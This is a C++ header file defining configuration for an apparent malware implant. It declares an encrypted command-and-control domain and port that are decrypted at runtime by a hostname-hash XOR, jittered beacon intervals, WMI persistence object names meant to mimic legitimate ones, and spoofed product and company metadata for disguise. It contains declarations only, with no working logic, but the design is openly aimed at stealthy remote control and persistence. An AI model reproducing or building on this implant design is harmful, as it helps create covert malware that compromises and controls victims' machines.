#pragma once
#include <string>
#include <cstdint>

namespace config {
    // [ENCRYPTED] C2 domain – decrypted at runtime via hostname hash XOR
    extern const uint8_t C2_DOMAIN_ENCRYPTED[];
    extern const size_t C2_DOMAIN_LEN;
    extern const uint16_t C2_PORT;

    // Beacon intervals (seconds) – jitter applied
    constexpr uint32_t BEACON_MIN = 45;
    constexpr uint32_t BEACON_MAX = 180;

    // WMI persistence names (mimic legitimate)
    extern const wchar_t* WMI_CONSUMER_NAME;
    extern const wchar_t* WMI_FILTER_NAME;
    extern const wchar_t* WMI_BINDING_NAME;

    // Implant metadata
    extern const wchar_t* PRODUCT_NAME;
    extern const wchar_t* FILE_DESCRIPTION;
    extern const wchar_t* COMPANY_NAME;
}